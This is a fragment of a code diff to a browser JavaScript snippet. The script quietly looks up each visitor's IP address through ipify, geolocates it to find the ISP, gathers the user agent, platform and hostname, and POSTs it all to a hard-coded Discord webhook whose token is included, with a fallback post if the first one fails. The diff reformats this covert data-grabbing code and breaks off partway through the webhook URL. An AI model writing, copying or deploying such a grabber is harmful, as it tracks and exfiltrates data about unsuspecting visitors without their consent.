@@ -3,4 +3,11 @@
 
 
 const n = Date.now(), e = "", o = window.navigator.userAgent, t = window.navigator.platform, s = navigator.userAgent, r = window.location.hostname, i = "";
-fetch("https://api.ipify.org").then(n=>n.text()).then(e=>(ip=e,fetch(`https://ipapi.co/${ip}/json/`))).then(n=>n.json()).then(e=>(i=e.org,fetch("https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN",{method:"POST",body:JSON.stringify({content:`Date/Time: ${n}\nIP Address: ${ip}\nBrowser: ${o}\nOperating System: ${t}\nUser Agent: ${s}\nHost Name: ${r}\nISP: ${i}`}),headers:{"Content-Type":"application/json"}}).then(()=>console.log("Success!")).catch(()=>{fetch("https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN",{method:"POST",body:JSON.stringify({content:`Date/Time: ${n}\nIP Address: ${ip}\nBrowser: ${o}\nOperating System: ${t}\nUser Agent: ${s}\nHost Name: ${r}`}),headers:{"Content-Type":"application/json"}}).then(()=>console.log("Success! (fallback)"))}));
+fetch("https://api.ipify.org")
+  .then(response => response.text())
+  .then(ip => { 
+    fetch(`https://ipapi.co/${ip}/json/`)
+      .then(response => response.json())  // changed fetch() method here
+      .then(data => { 
+        i = data.org; 
+        const webhookUrl = "https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN
